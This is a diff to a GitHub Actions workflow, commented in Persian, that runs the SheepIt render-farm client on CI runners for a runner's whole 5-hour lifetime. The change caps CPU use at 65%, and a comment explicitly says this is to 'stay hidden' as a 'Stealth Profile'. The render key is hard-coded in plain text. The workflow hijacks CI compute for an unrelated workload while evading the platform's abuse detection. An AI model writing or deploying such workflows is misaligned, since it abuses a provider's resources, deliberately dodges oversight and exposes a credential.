@@ -32,23 +32,24 @@ jobs:
           
       - name: اجرای SheepIt Client
         run: |
-          # اجرای کلاینت با محدودیت CPU
-          (java -jar sheepit-client.jar \
-            -login "$(echo ${{ secrets.SHEEPIT_USERNAME }} || echo 'YOUR_USERNAME')" \
-            -key "VMBWGS9M0PFdsKBH43GUJgy8LmvG0aHBLyECjXJv" \
+          # اجرای کلاینت با استفاده از -password برای Render Key
+          # محدود کردن مصرف به 65% برای مخفی ماندن (Stealth Profile)
+          
+          java -jar sheepit-client.jar \
+            -login "${{ secrets.SHEEPIT_USERNAME || 'YOUR_USERNAME' }}" \
+            -password "VMBWGS9M0PFdsKBH43GUJgy8LmvG0aHBLyECjXJv" \
             -cores 2 \
             -memory 3500 \
-            -verbose \
             -no-gpu \
-            -ui text) &
+            -ui text &
           
           JAVA_PID=$!
           
-          # محدود کردن مصرف CPU به 65%
-          sleep 10
+          # صبر کنید تا پروسه کاملاً بالا بیاید سپس محدودیت را اعمال کنید
+          sleep 15
           sudo cpulimit -p $JAVA_PID -l 65 -b
           
-          # نگه داشتن پروسه تا پایان زمان
+          # نگه داشتن پروسه تا پایان عمر 5 ساعته ورکر
           wait $JAVA_PID
           
       - name: گزارش وضعیت
